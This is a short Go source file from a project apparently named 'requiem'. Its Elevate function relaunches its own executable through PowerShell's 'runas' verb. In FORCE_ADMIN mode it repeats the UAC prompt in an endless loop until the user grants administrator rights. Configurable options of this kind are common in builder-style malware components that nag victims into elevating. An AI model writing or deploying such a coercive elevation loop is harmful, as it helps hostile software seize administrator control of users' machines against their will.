package funcs

import (
	"fmt"
	"os"
	"os/exec"

	"requiem/store"
)

func Elevate() {
	if store.FORCE_ADMIN {
		for {
			cmd := exec.Command("powershell", "-c",
				fmt.Sprintf(`start "%s" -verb runas`, store.ExecPath),
			)

			err := cmd.Run()
			if err != nil {
				continue
			}

			os.Exit(0)
		}
	}

	if store.PROMPT_ADMIN {
		cmd := exec.Command("powershell", "-c",
			fmt.Sprintf(`start "%s" -verb runas`, store.ExecPath),
		)

		err := cmd.Run()
		if err != nil && !store.CONTINUE_WITHOUT_ADMIN {
			os.Exit(0)
		}
	}
}
